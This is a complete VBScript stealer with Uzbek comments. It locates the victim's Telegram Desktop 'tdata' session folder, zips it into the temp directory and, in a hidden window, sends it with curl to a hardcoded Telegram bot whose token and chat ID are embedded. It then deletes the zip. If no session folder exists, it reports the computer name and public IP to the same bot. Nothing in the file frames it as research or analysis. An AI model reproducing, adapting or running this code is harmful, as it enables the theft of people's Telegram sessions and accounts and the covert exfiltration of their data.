Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Telegram ma'lumotlari
BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = "7080045924"

Set WshNetwork = CreateObject("WScript.Network")
PCName = WshNetwork.ComputerName

' tdata papkasini qidirish
AppData = WshShell.ExpandEnvironmentStrings("%APPDATA%")
TDataPath = AppData & "\TelegramDesktop\tdata"

If FSO.FolderExists(TDataPath) Then
    TempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
    ZipName = "tdata_" & PCName & ".zip"
    ZipPath = TempDir & "\" & ZipName

    Set objShell = CreateObject("Shell.Application")
    Set objFolder = objShell.NameSpace(TDataPath)
    Set objZip = objShell.NameSpace(ZipPath)

    ' ZIP siqish
    On Error Resume Next
    objZip.CopyHere objFolder.Items, 16
    On Error GoTo 0

    ' Siqilishi uchun 5 soniya kutish (katta fayllar uchun)
    WScript.Sleep 5000

    ' Telegramga fayl yuborish (BU SAFAR CURL ISHLATILADI!)
    WshShell.Run "cmd /c curl -s -F chat_id=" & CHAT_ID & " -F document=@" & ZipPath & " -F caption='✅ tdata yigildi! " & PCName & "' https://api.telegram.org/bot" & BOT_TOKEN & "/sendDocument", 0, True

    ' ZIP faylni o'chirish
    FSO.DeleteFile(ZipPath)
Else
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    http.open "GET", "https://api.ipify.org", False
    http.send
    ip = http.responseText

    WshShell.Run "cmd /c curl -s -d chat_id=" & CHAT_ID & " -d text='⚠️ tdata topilmadi! " & PCName & ", IP: " & ip & "' https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage", 0, True
End If
